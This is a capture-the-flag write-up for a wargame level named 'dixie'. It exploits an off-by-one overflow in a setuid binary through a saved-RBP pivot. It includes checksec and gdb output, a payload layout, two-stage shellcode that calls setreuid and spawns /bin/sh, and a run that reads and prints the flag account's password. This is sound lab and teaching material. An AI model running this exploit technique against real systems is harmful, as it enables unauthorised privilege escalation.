# Level02 — dixie

## Initial checks

We use these checks at the start of every challenge, to see what protections the binary has and who owns it.

```
level02@rainfall:~$ pwn checksec dixie
[*] '/home/level02/dixie'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

What matters here:
- **No canary found**: nothing stops us from overwriting the saved `RBP`.
- **No PIE (0x400000)**: fixed load address, as always on this box.
- **Stack: Executable / Has RWX segments**: unlike the first two levels, we don't need `libc` gadgets at all. We can jump straight into our own injected shellcode.

```
level02@rainfall:~$ file dixie
dixie: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a362ad298d201395bf4f245ff31617e88f8bcc9f, for GNU/Linux 3.2.0, not stripped
level02@rainfall:~$ ls -lh dixie
-rwsr-x--- 1 flag02 level02 17K Jun  9 23:13 dixie
level02@rainfall:~$ id flag02
uid=1019(flag02) gid=1021(flag02) groups=1021(flag02),1002(flaggroup)
```

Setuid, owned by `flag02`, uid `1019` — that's the target.

```
level02@rainfall:~$ cat /proc/sys/kernel/randomize_va_space
0
```

ASLR disabled, same as every other level on this box.

`not stripped` means function names survive (we can `break store_record` by name), but there's no DWARF debug info, so gdb can't resolve local variables like `buf` by name either — that's relevant below.

## The vulnerability

`store_record()`'s only stack-resident local is `buf[64]` (`in_len`/`in_ch` are file-scope statics, not on the stack):

```c
char buf[BUF_SIZE];   // BUF_SIZE = 64
...
in_len = 0;
while (in_len <= BUF_SIZE) {
    in_ch = read(0, &buf[in_len], 1);
    if (in_ch <= 0) break;
    in_len++;
}
```

The loop condition is `<=`, so `in_len` runs `0..64` inclusive: **65** one-byte reads into a 64-byte buffer. That one extra byte (`buf[64]`) isn't just "off the end" in some vague sense — since `buf` is the function's only local, the compiler places it directly below the saved `RBP` with no padding, so `buf[64]` *is* the lowest byte of the saved `RBP` slot. One byte too far overwrites exactly that byte, nothing more.

## Finding the offset to the return address

There's no `cyclic` pattern here — the offset is fixed by the source: `BUF_SIZE = 64`, and the single off-by-one byte lands on the low byte of the saved `RBP`, not on the return address itself. What we control is **one byte of `RBP`**, which is enough to redirect where the *next* `leave; ret` pivots to.

To build the exploit we need `buf`'s real stack address. No debug info, so we disassemble `store_record` to find the address of its `read()` call and break directly on it:

```
level02@rainfall:~$ env -i gdb -nx ./dixie
(gdb) disas store_record
...
(gdb) b *0x0000000000401448
Breakpoint 2 at 0x401448
(gdb) r
Starting program: /home/level02/dixie
  [FLATLINE] The Dixie Flatline lives again.
  [FLATLINE] ROM construct v3.0 — memory interface ready.
[FLATLINE] Ready:
Breakpoint 2, 0x0000000000401448 in store_record ()
(gdb) p $rbp
$1 = (void *) 0x7fffffffeca0
(gdb) p $rsp
$2 = (void *) 0x7fffffffec60
(gdb) p/x $rsi
$3 = 0x7fffffffec60
```

`$rsp` and `$rsi` both equal `0x7fffffffec60` — that's `buf_addr`. `$rbp` is `buf_addr + 0x40` (+64), confirming `buf` sits directly below the saved `RBP` with no padding, exactly as the off-by-one comment in the source says. We run under `env -i` because stack addresses shift with the size of `argv`/`envp`, and the final exploit also runs through `env -i bash -c '...'`, so the address found here is the one the exploit actually sees.

## Choosing the target: shellcode on an executable stack

No `ropper` step this time — `checksec` already showed the stack is executable, so instead of chaining `libc` gadgets we inject code directly and jump into it. We still need `setreuid(1019, 1019)` + a shell, just written as raw instructions instead of gadget addresses.

## Exploitation walkthrough

**The one-byte overwrite.** `store_record()` was called from `main()`, so the saved `RBP` sitting right after `buf` currently holds `main`'s real `RBP`. Writing `0x58` as byte 65 changes only its lowest byte. `store_record()`'s own `ret` is unaffected (the return-address slot, 8 bytes further up, is never touched), so it returns to `main()` normally — but from then on, `main()` is running with a corrupted `RBP`.

**The pivot.** `main()` eventually reaches its own `leave; ret`. `leave` sets `rsp = rbp` (the corrupted value) and pops 8 bytes from there into `RBP`; `ret` then pops the next 8 bytes as the new return address. `0x58` was picked so the corrupted `RBP` equals `buf_addr - 8`:
- `pop rbp` reads 8 unused bytes sitting right before `buf` (harmless)
- `ret` pops the 8 bytes **at `buf_addr`**, which we filled with `p64(buf_addr + 8)` — so execution jumps to `buf_addr + 8`, exactly where our shellcode starts.

**The payload layout**, 65 bytes total (all `store_record`'s read loop will take):

```
payload  = p64(buf_addr + 8)        # [buf_addr      ] fake "saved RBP" ptr, used by ret as the jump target
payload += code1                    # [buf_addr+8    ] stage-1 shellcode
payload  = payload.ljust(64, b'\x90')  # NOP padding out to 64 bytes
payload += p8(0x58)                 # [buf+64        ] the off-by-one byte: low byte of saved RBP
```

**Stage 1** (`code1`) only needs to be small enough to fit before byte 64: it does a fresh, unrestricted `read(0, rsp+40, 40)` to pull in the real payload, then jumps into it — sidestepping the 65-byte limit entirely:

```
xor eax, eax        ; read()
xor edi, edi        ; fd = 0
lea rsi, [rsp + 40]
mov edx, 40
syscall
jmp rsi              ; run what we just read
```

**Stage 2** (`code2`, sent as a second write right after the first, landing in the 40 bytes stage 1 just read) does the actual privilege escalation:

```
mov al, 113          ; setreuid
mov edi, 1019
mov esi, edi
cdq
syscall              ; setreuid(1019, 1019)
xor esi, esi
xor eax, eax
movabs rdi, {binsh}  ; address of "/bin/sh" in libc
mov al, 59           ; execve
syscall              ; execve("/bin/sh", NULL, NULL)
```

Run for real:

```
level02@rainfall:~$ python3 exploit.py > payload.bin
level02@rainfall:~$ env -i bash -c '(cat payload.bin ; cat) | /home/level02/dixie'
  [FLATLINE] The Dixie Flatline lives again.
  [FLATLINE] ROM construct v3.0 — memory interface ready.
[FLATLINE] Ready: [FLATLINE] Record 0 stored. Checksum: 7e6cf87d
[FLATLINE] Record 0: h (checksum: 7e6cf87d)
  [FLATLINE]  session closed.
id
uid=1019(flag02) gid=1005(level02) groups=1005(level02),1001(levelgroup)
cat /home/flag02/.pass
qeplvibynup98phqb312dkvhtpdkklac
```

`env -i` clears the environment so the stack layout here matches the one `buf_addr` was measured in. The trailing `cat` keeps stdin open so the shell doesn't see EOF immediately.

## Stack layout during the overflow

```text
store_record()'s frame, high address at top:
+-------------------------+
|  return addr -> main    |   untouched: store_record() returns normally
+-------------------------+
|  saved RBP (= main's)   |   <-- only its LOW BYTE is overwritten, to 0x58
+-------------------------+
|  buf[64]                |   fake ptr (8B) + stage-1 shellcode + NOP padding
+-------------------------+
low address

The fake frame this builds, read later by main()'s own leave;ret:
buf_addr - 8  : (unused garbage, consumed by 'pop rbp')
buf_addr      : p64(buf_addr + 8)   <-- popped by 'ret', becomes the new RIP
buf_addr + 8  : stage-1 shellcode   <-- execution lands here
```

## Running it

```
python3 exploit.py > payload.bin
env -i bash -c '(cat payload.bin ; cat) | /home/level02/dixie'
```